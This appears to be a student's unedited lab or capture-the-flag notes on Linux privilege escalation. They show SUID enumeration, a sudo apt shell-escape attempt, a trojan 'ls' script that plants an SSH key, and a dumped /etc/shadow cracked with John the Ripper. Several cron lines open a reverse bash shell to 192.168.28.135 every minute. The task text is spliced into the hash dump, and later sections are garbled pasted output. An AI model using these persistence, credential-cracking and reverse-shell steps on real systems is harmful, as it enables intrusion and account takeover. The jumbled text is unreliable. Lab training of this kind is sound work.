+The commented-out lines indicate examples of forwarding logs. The active line forwards all messages (*.*) to a remote rsyslog server at 193.0.12.1 on port 10514 using the omfwd output module and udp protocol [1].
+For more details on syntax and configuration, you can consult the official rsyslog documentation. 
+
+for abnormal location - /var/log - this goes to the normal location. Anything else outside of that is abnormal.
+
+Priv1
+
+comrade@lin2:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+zeus:x:0:0:zeus:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+comrade:x:1001:1001::/home/comrade:/bin/bash
+billybob:x:1002:1002::/home/billybob:/bin/bash
+bobby:x:1003:1003::/home/bobby:/bin/bash
+jerry:x:1004:1004::/home/jerry:/bin/bash
+jimmy:x:1005:1005::/home/jimmy:/bin/bash
+sarah:x:1006:1006::/home/sarah:/bin/bash
+wendy:x:1007:1007::/home/wendy:/bin/bash
+comrade@lin2:~$ 
+
+
+If you want to see the "default" path that applies to everyone before they make personal changes, check these system-wide files: 
+/etc/environment: The primary file for system-wide environment variables.
+Command: cat /etc/environment
+/etc/profile: The main startup script for login shells.
+Command: grep "PATH" /etc/profile
+/etc/profile.d/: A directory containing scripts that often append specialized paths for all users.
+Command: grep -r "PATH" /etc/profile.d/ 
+
+
+comrade@lin2:/$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+[sudo] password for comrade: 
+comrade is not in the sudoers file.  This incident will be reported.
+comrade@lin2:/$ find / -type f -perm /4000 -ls 2>/dev/null
+    64256    372 -rwsr-xr--   1 root     dip        378600 Jul 23  2020 /usr/sbin/pppd
+     6493    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+    12442    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+     7930     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     8026    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+     7934     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+     8020     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+     4341     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
+     4342     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
+     4648     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
+     4339     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
+     4140     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
+     4338     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
+     4539     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
+     4659     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
+     4495     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+     4647     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
+    64069     24 -rwsr-xr-x   1 root     root          22528 Jun 28  2019 /usr/bin/arping
+     4261    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
+      139     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
+       56     44 -rwsr-xr-x   1 root     root          43088 Jan  8  2020 /bin/mount
+      109     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
+       55     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
+       57     28 -rwsr-xr-x   1 root     root          26696 Jan  8  2020 /bin/umount
+comrade@lin2:/$ find / -type f -perm /2000 -ls 2>/dev/null
+     6532     12 -rwxr-sr-x   1 root     utmp        10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+     8026    108 -rwsr-sr-x   1 root     root       109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+     4337     72 -rwxr-sr-x   1 root     shadow      71816 Mar 22  2019 /usr/bin/chage
+     4303     40 -rwxr-sr-x   1 root     crontab     39352 Nov 16  2017 /usr/bin/crontab
+     4340     24 -rwxr-sr-x   1 root     shadow      22808 Mar 22  2019 /usr/bin/expiry
+     4499     44 -rwxr-sr-x   1 root     mlocate     43088 Mar  1  2018 /usr/bin/mlocate
+     4507    356 -rwxr-sr-x   1 root     ssh        362640 Mar  4  2019 /usr/bin/ssh-agent
+     4400     16 -rwxr-sr-x   1 root     tty         14328 Jan 17  2018 /usr/bin/bsd-write
+     4539     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
+     4058     32 -rwxr-sr-x   1 root     tty         30800 Jan  8  2020 /usr/bin/wall
+     3823     36 -rwxr-sr-x   1 root     shadow      34816 Feb 27  2019 /sbin/unix_chkpwd
+     3819     36 -rwxr-sr-x   1 root     shadow      34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+comrade@lin2:/$
+
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMnUROjsdsM4dbziBumkNgvwfxwzIBaAiC+QZwDIqVUnijnWM3aCI+9ztECDkCFtQYMrJXvESp/xlJsaWzvXMwNF5/oGaSnASy5M77BQZgB7S3S9DXliyj4VBTgzNY3SQ+WY/LG100FOLi+dCqVeSDEKu6oWl5VjYk5ShjrzTsa5ZkbH7xdkEWlulGgPzYwcNFwTijpNqzOUALUuVrF0xe3UIZZJWyrnfaOsNuj59CxcKjLWPRJ+PjK3JcyJ5BZV6Sc57t6f+sG+iDWkBRCLx8jthSgwoKiJ2fioNzAfII6VALycDEf2irw7qGtdhVSnYdMTQqEObLx/PFxZvmx6HX student@lin-ops" >> /users/home/directory/.ssh/authorized_keys
+
+cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
+need to develop a script that reads - ls
+
+now lets first generate keys
+ssh-keygen -t rsa
+cat ~/.ssh/id_rsa.pub
+
+Script - for ls
+
+nano ls
+
+script:
+
+	#!/bin/bash
+
+	# script that sends information to a remote system.
+
+
+	mkdir /home/billybob/.ssh   #make .ssh in users home folder if it does not exist
+
+	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMnUROjsdsM4dbziBumkNgvwfxwzIBaAiC+QZwDIqVUnijnWM3aCI+9ztECDkCFtQYMrJXvESp/xlJsaWzvXMwNF5/oGaSnASy5M77BQZgB7S3S9DXliyj4VBTgzNY3SQ+WY/LG100FOLi+dCqVeSDEKu6oWl5VjYk5ShjrzTsa5ZkbH7xdkEWlulGgPzYwcNFwTijpNqzOUALUuVrF0xe3UIZZJWyrnfaOsNuj59CxcKjLWPRJ+PjK3JcyJ5BZV6Sc57t6f+sG+iDWkBRCLx8jthSgwoKiJ2fioNzAfII6VALycDEf2irw7qGtdhVSnYdMTQqEObLx/PFxZvmx6HX student@lin-ops" >> /home/billybob/.ssh/authorized_keys
+
+	cat /home/billybob/.ssh/authorized_keys > /var/tmp/test.txt 
+
+cp ls > /tmp
+cp ls > /var/tmp
+
+make sure you chmod +x these files (ls) in each location.  need to make them executable.
+
+
+login as billybob
+
+billybob@lin2:~$ sudo cat /etc/shadow
+root:$6$4qT1d2NQ$qjWVVSSnpvI0yYBYMyKEMnYiFukfL4vVav.Q43K2WAQ.FKCJvq9yYntnFuP7XpiUSMoEzOK56rRu81yfziXlT/:20458:0:99999:7:::
+zeus:$6$V34Nv7Ib$.PZChAQgzH9FMTfoUN0X3Y2mUIT3/rXju7cmXa2mAVTAZscB48slP8A333kYxrtlPzMLN9yEd5wZnQJe4Wzbz/:18934:0:99999:7:::
+daemon:*:18325:0:99999:7:::
+bin:*:18325:0:99999:7:::
+sys:*:18325:0:99999:7:::
+sync:*:18325:0:99999:7:::
+games:*:18325:0:99999:7:::
+man:*:18325:0:99999:7:::
+lp:*:18325:0:99999:7:::
+mail:*:18325:0:99999:7:::
+news:*:18325:0:99999:7:::Once you obtain root access, you are to implement persistence using a reverse bash shell via CRON.
+
+The IP address and port for the reverse shell will be supplied to you. IP: 192.168.28.135 Port: 33403
+
+There are several CRON files you can use. Your CRON job is to beacon out every minute. If it isn’t set to beacon every minute, you will not get the flag. Once completed, the flag will be placed in the /tmp directory.
+
+Your flag will be a unique twenty character string.
+
+uucp:*:18325:0:99999:7:::
+proxy:*:18325:0:99999:7:::
+www-data:*:18325:0:99999:7:::
+backup:*:18325:0:99999:7:::
+list:*:18325:0:99999:7:::
+irc:*:18325:0:99999:7:::
+gnats:*:18325:0:99999:7:::
+nobody:*:18325:0:99999:7:::
+systemd-network:*:18325:0:99999:7:::
+systemd-resolve:*:18325:0:99999:7:::
+syslog:*:18325:0:99999:7:::
+messagebus:*:18325:0:99999:7:::
+_apt:*:18325:0:99999:7:::
+lxd:*:18325:0:99999:7:::
+uuidd:*:18325:0:99999:7:::
+dnsmasq:*:18325:0:99999:7:::
+landscape:*:18325:0:99999:7:::
+sshd:*:18325:0:99999:7:::
+pollinate:*:18325:0:99999:7:::
+ubuntu:!:18934:0:99999:7:::
+comrade:$6$EabwO.sc$zT1xo.vDKK209IDOiZjDIXoc8YGU2ljT/LEE8i.pG0bO1xvHMTsZQKGkBAuDqZ4r7Xk4dNJzIVFe6VdzLt8PT0:18934:0:99999:7:::
+billybob:$6$je9YkJOP$Jdu6dFuwkqS3Qg5xT.2dq9elEU9b0.ybTaXwIYFnqn9g/k0h.n1PtUOROf28gVVxNzYJ4z8.uw7ve9BTD7t611:18934:0:99999:7:::
+bobby:$6$ryRQEt/S$lTxP9YSMV4NllvVwpHyw4I.sgl7a4htNeKgzHeGNyhXKLtLgTBF2rYd9y.fcO3cgA2cBL8RrwRIL1yrwSPbM7.:18934:0:99999:7:::
+jerry:$6$YMWB7T6W$7f2Nx71Tt4eNDBuBeo6H.kjs93nIRD1j924GWZ.s/Xp5FNgo3JzJowgOhQ.8LkHcYFNuY1l4m3EJ5Br0FQMiU0:18934:0:99999:7:::
+jimmy:$6$h5lL6ckI$cL.Oei4ZvvG2iyiaD2HK09MVFpa0NGUZkVF5FSewC42NlNt2//I/FrzA0o3LXGZRlGck004K1i08CWpnkLj2l1:18934:0:99999:7:::
+sarah:$6$CBpHvShR$1CIKzlI9glGDyBDzoisnOBBvWBYAjlmGeqOPLrncAxFh6Ylvda3o31amBxtiU/L3XgjoZVCFjhW1.cv40MHwm/:18934:0:99999:7:::
+wendy:$6$p596ZHHF$Tse1FrfiLQQaAxxqlZpbYe9c3n6qZbzQmiGcuCFv8IwcvqC0v8422.mw4mR.dBKMQTNbq5/sj/c9VIV3JncNB0:18934:0:99999:7:::
+
+billybob@lin2:~$ scp ./10-million-password-list-top-10000.txt student@10.50.156.114:/home/student/10-million-passwords-list-top-10000.txt
+student@10.50.156.114's password: 
+10-million-password-list-top-10000.txt                                                                              100%   75KB  11.6MB/s   00:00    
+billybob@lin2:~$ 
+
+create an shadows.txt file on your local op machine
+
+student@lin-ops:~$ sudo john
+Created directory: /root/.john
+John the Ripper password cracker, version 1.8.0
+Copyright (c) 1996-2013 by Solar Designer
+Homepage: http://www.openwall.com/john/
+
+Usage: john [OPTIONS] [PASSWORD-FILES]
+--single                   "single crack" mode
+--wordlist=FILE --stdin    wordlist mode, read words from FILE or stdin
+--rules                    enable word mangling rules for wordlist mode
+--incremental[=MODE]       "incremental" mode [using section MODE]
+--external=MODE            external mode or word filter
+--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
+--restore[=NAME]           restore an interrupted session [called NAME]
+--session=NAME             give a new session the NAME
+--status[=NAME]            print status of a session [called NAME]
+--make-charset=FILE        make a charset, FILE will be overwritten
+--show                     show cracked passwords
+--test[=TIME]              run tests and benchmarks for TIME seconds each
+--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
+--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
+--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
+--salts=[-]N               load salts with[out] at least N passwords only
+--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
+--node=MIN[-MAX]/TOTAL     this node's number range out of TOTAL count
+--fork=N                   fork N processes
+--format=NAME              force hash type NAME: descrypt/bsdicrypt/md5crypt/
+                           bcrypt/LM/AFS/tripcode/dummy/crypt
+
+student@lin-ops:~$ sudo john --wordlist=/home/student/10-million-passwords-list-top-10000.txt /home/student/shadow.txt
+Loaded 9 password hashes with 9 different salts (crypt, generic crypt(3) [?/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+
+
+student@lin-ops:~$ sudo john --wordlist=/home/student/10-million-passwords-list-top-10000.txt /home/student/shadow.txt
+Loaded 9 password hashes with 9 different salts (crypt, generic crypt(3) [?/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+a
+ghjcnbnenrf      (zeus)
+1g 0:00:03:44 100% 0.004452g/s 44.52p/s 400.6c/s 400.6C/s darina..brady
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+
+root@lin2:~# sudo -l
+Matching Defaults entries for root on lin2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on lin2:
+    (ALL : ALL) ALL
+root@lin2:~# crontab -l
+no crontab for root
+root@lin2:~# cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+
+
+Next flag
+
+crontab -l
+nano /etc/crontab
+* * * * * root bash -i >& /dev/tcp/192.168.28.135/33403 0>&1
+search the tmp file
+close out.
+
+
+Altnerate version:
+To implement persistence via a reverse bash shell in a CRON job for the specified IP and port, follow these steps:
+Access the Crontab: Open the root user's crontab for editing by running the command crontab -e. This is located in /var/spool/..
+Add the Reverse Shell Command: Append the following line to the file to ensure the beacon executes every minute:
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
+Verify Permissions: If you prefer using a system-wide CRON directory, you can create a file in /etc/cron.d/ with the same timing syntax, ensuring it specifies the root user:
+* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
+Retrieve the Flag: Once the CRON job triggers and the connection is established, check the /tmp directory for the 20-character flag string.
+For further technical documentation on scheduling tasks, refer to the Ubuntu Cron documentation or the Debian Wiki on Cron.
+
+
+
+comrade@lin1:~$ find / -type f -perm /6000 -ls 2>/dev/null
+   258328     20 -rwxr-sr-x   1 root     staff       16520 Oct 20  2021 /var/tmp/testbed/unknown
+    64365    372 -rwsr-xr--   1 root     dip        378600 Jul 23  2020 /usr/sbin/pppd
+     6532     12 -rwxr-sr-x   1 root     utmp        10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+     6493    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+    12442    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+     7930     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     8026    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+     7934     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+     8020     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+     4341     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
+     4337     72 -rwxr-sr-x   1 root     shadow        71816 Mar 22  2019 /usr/bin/chage
+     4342     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
+     4303     40 -rwxr-sr-x   1 root     crontab       39352 Nov 16  2017 /usr/bin/crontab
+     4340     24 -rwxr-sr-x   1 root     shadow        22808 Mar 22  2019 /usr/bin/expiry
+     4499     44 -rwxr-sr-x   1 root     mlocate       43088 Mar  1  2018 /usr/bin/mlocate
+     4507    356 -rwxr-sr-x   1 root     ssh          362640 Mar  4  2019 /usr/bin/ssh-agent
+     4648     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
+     4339     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
+     4140     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
+     4338     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
+     4400     16 -rwxr-sr-x   1 root     tty           14328 Jan 17  2018 /usr/bin/bsd-write
+     4539     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
+     4659     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
+     4058     32 -rwxr-sr-x   1 root     tty           30800 Jan  8  2020 /usr/bin/wall
+     4495     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+     4647     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
+    64178     24 -rwsr-xr-x   1 root     root          22528 Jun 28  2019 /usr/bin/arping
+     4261    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
+     3823     36 -rwxr-sr-x   1 root     shadow        34816 Feb 27  2019 /sbin/unix_chkpwd
+     3819     36 -rwxr-sr-x   1 root     shadow        34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+      139     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
+       56     44 -rwsr-xr-x   1 root     root          43088 Jan  8  2020 /bin/mount
+      109     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
+       55     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
+       57     28 -rwsr-xr-x   1 root     root          26696 Jan  8  2020 /bin/umount
+comrade@lin1:~$ cd /var/tmp/testbed/unknown
+-bash: cd: /var/tmp/testbed/unknown: Not a directory
+comrade@lin1:~$ cd /var/tmp/testbed/
+comrade@lin1:/var/tmp/testbed$ ls -la
+total 32
+drwxr-xr-x 3 root staff  4096 Nov  3  2021 .
+drwxrwxrwt 6 root root   4096 Jan  5 16:18 ..
+drwxrwx--- 2 root staff  4096 Nov  3  2021 logger
+-rwxr-sr-x 1 root staff 16520 Oct 20  2021 unknown
+comrade@lin1:/var/tmp/testbed$ file unknown 
+unknown: setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, not stripped
+
+
+comrade@lin1:/var/tmp/testbed$ strings unknown 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+execv
+puts
+fork
+__stack_chk_fail
+printf
+__errno_location
+waitpid
+__cxa_finalize
+strerror
+__libc_start_main
+GLIBC_2.4
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+AWAVI
+AUATL
+[]A\A]A^A_
+/var/tmp/testbed/logger/logger
+Something went wrong with executing %s, %s
+Invalid number of arguments
+;*3$"
+GCC: (Gentoo 7.3.0-r3 p1.4) 7.3.0
+GCC: (Gentoo 8.2.0-r3 p1.4) 8.2.0
+unknown.c
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+__errno_location@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+__stack_chk_fail@@GLIBC_2.4
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+waitpid@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+strerror@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+execv@@GLIBC_2.2.5
+fork@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+
+
+
+comrade@lin1:/var/tmp/testbed$ which fork
+comrade@lin1:/var/tmp/testbed$ which printf
+/usr/bin/printf
+comrade@lin1:/var/tmp/testbed$ which waitpid
+comrade@lin1:/var/tmp/testbed$ which strerror
+comrade@lin1:/var/tmp/testbed$ which execv
+comrade@lin1:/var/tmp/testbed$ ./unknown 
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 1
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 110
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 2 2 2 2 2 
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 2 2 2 2 2 2 2 2 2 2 
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 2 2 2 
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 2 2 2 2
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 2 2 2 2 2
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 2 2 2 2 2 2
+Invalid number of arguments
+comrade@lin1:/var/tmp/testbed$ ./unknown 2 2
+comrade@lin1:/var/tmp/testbed$ 
+
+comrade@lin1:/var/tmp/testbed$ ls -la
+total 36
+drwxr-xr-x 3 root staff  4096 Jan  7 22:05 .
+drwxrwxrwt 6 root root   4096 Jan  5 16:18 ..
+-rw-rw-r-- 1 root staff     2 Jan  7 22:05 2
+drwxrwx--- 2 root staff  4096 Nov  3  2021 logger
+-rwxr-sr-x 1 root staff 16520 Oct 20  2021 unknown
+comrade@lin1:/var/tmp/testbed$ cat 2
+2
+comrade@lin1:/var/tmp/testbed$ ./unknown 3 3
+comrade@lin1:/var/tmp/testbed$ ./unknown 3 2
+comrade@lin1:/var/tmp/testbed$ ls -la
+total 40
+drwxr-xr-x 3 root staff  4096 Jan  7 22:06 .
+drwxrwxrwt 6 root root   4096 Jan  5 16:18 ..
+-rw-rw-r-- 1 root staff     2 Jan  7 22:05 2
+-rw-rw-r-- 1 root staff     4 Jan  7 22:06 3
+drwxrwx--- 2 root staff  4096 Nov  3  2021 logger
+-rwxr-sr-x 1 root staff 16520 Oct 20  2021 unknown
+comrade@lin1:/var/tmp/testbed$ cat 3
+3
+2
+comrade@lin1:/var/tmp/testbed$ ./unknown 3 4
+comrade@lin1:/var/tmp/testbed$ ls -la
+total 40
+drwxr-xr-x 3 root staff  4096 Jan  7 22:06 .
+drwxrwxrwt 6 root root   4096 Jan  5 16:18 ..
+-rw-rw-r-- 1 root staff     2 Jan  7 22:05 2
+-rw-rw-r-- 1 root staff     6 Jan  7 22:07 3
+drwxrwx--- 2 root staff  4096 Nov  3  2021 logger
+-rwxr-sr-x 1 root staff 16520 Oct 20  2021 unknown
+comrade@lin1:/var/tmp/testbed$ cat 3
+3
+2
+4
+comrade@lin1:/var/tmp/testbed$ ./unknown 2 4
+comrade@lin1:/var/tmp/testbed$ cat 2
+2
+4
+
+
+
+comrade@lin1:/tmp$ comrade@lin1:/var/tmp/testbed$ ls -la
+-bash: comrade@lin1:/var/tmp/testbed$: No such file or directory
+comrade@lin1:/tmp$ total 40
+
+Command 'total' not found, did you mean:
+
+  command 'topal' from deb topal
+
+Try: apt install <deb name>
+
+comrade@lin1:/tmp$ drwxr-xr-x 3 root staff  4096 Jan  7 22:06 .
+drwxr-xr-x: command not found
+comrade@lin1:/tmp$ drwxrwxrwt 6 root root   4096 Jan  5 16:18 ..
+drwxrwxrwt: command not found
+comrade@lin1:/tmp$ -rw-rw-r-- 1 root staff     2 Jan  7 22:05 2
+-rw-rw-r--: command not found
+comrade@lin1:/tmp$ -rw-rw-r-- 1 root staff     4 Jan  7 22:06 3
+-rw-rw-r--: command not found
+comrade@lin1:/tmp$ drwxrwx--- 2 root staff  4096 Nov  3  2021 logger
+drwxrwx---: command not found
+comrade@lin1:/tmp$ -rwxr-sr-x 1 root staff 16520 Oct 20  2021 unknown
+-rwxr-sr-x: command not found
+comrade@lin1:/tmp$ comrade@lin1:/var/tmp/testbed$ cat 3
+-bash: comrade@lin1:/var/tmp/testbed$: No such file or directory
+comrade@lin1:/tmp$ 3
+3: command not found
+comrade@lin1:/tmp$ 2
+2: command not found
+comrade@lin1:/tmp$ comrade@lin1:/var/tmp/testbed$ ./unknown 3 4
+-bash: comrade@lin1:/var/tmp/testbed$: No such file or directory
+comrade@lin1:/tmp$ comrade@lin1:/var/tmp/testbed$ ls -la
+-bash: comrade@lin1:/var/tmp/testbed$: No such file or directory
+comrade@lin1:/tmp$ total 40
+
+Command 'total' not found, did you mean:
+
+  command 'topal' from deb topal
+
+Try: apt install <deb name>
+
+comrade@lin1:/tmp$ drwxr-xr-x 3 root staff  4096 Jan  7 22:06 .
+drwxr-xr-x: command not found
+comrade@lin1:/tmp$ drwxrwxrwt 6 root root   4096 Jan  5 16:18 ..
+drwxrwxrwt: command not found
+comrade@lin1:/tmp$ -rw-rw-r-- 1 root staff     2 Jan  7 22:05 2
+-rw-rw-r--: command not found
+comrade@lin1:/tmp$ -rw-rw-r-- 1 root staff     6 Jan  7 22:07 3
+-rw-rw-r--: command not found
+comrade@lin1:/tmp$ drwxrwx--- 2 root staff  4096 Nov  3  2021 logger
+drwxrwx---: command not found
+comrade@lin1:/tmp$ -rwxr-sr-x 1 root staff 16520 Oct 20  2021 unknown
+-rwxr-sr-x: command not found
+comrade@lin1:/tmp$ comrade@lin1:/var/tmp/testbed$ cat 3
+-bash: comrade@lin1:/var/tmp/testbed$: No such file or directory
+comrade@lin1:/tmp$ 3
+3: command not found
+comrade@lin1:/tmp$ 2
+2: command not found
+comrade@lin1:/tmp$ 4
+4: command not found
+comrade@lin1:/tmp$ comrade@lin1:/var/tmp/testbed$ ./unknown 2 4
+-bash: comrade@lin1:/var/tmp/testbed$: No such file or directory
+comrade@lin1:/tmp$ comrade@lin1:/var/tmp/testbed$ cat 2
+-bash: comrade@lin1:/var/tmp/testbed$: No such file or directory
+comrade@lin1:/tmp$ 2
+2: command not found
+comrade@lin1:/tmp$ 4
+4: command not found
+comrade@lin1:/tmp$ cd /var/tmp
+comrade@lin1:/var/tmp$ ls
+systemd-private-45fc7bbf1bd14111ab2c0a5d13a4d276-ModemManager.service-1tViiX  systemd-private-45fc7bbf1bd14111ab2c0a5d13a4d276-systemd-resolved.service-zO0vbZ  systemd-private-45fc7bbf1bd14111ab2c0a5d13a4d276-systemd-timesyncd.service-3eGIm5  testbed
+comrade@lin1:/var/tmp$ cd testbed/
+comrade@lin1:/var/tmp/testbed$ ls
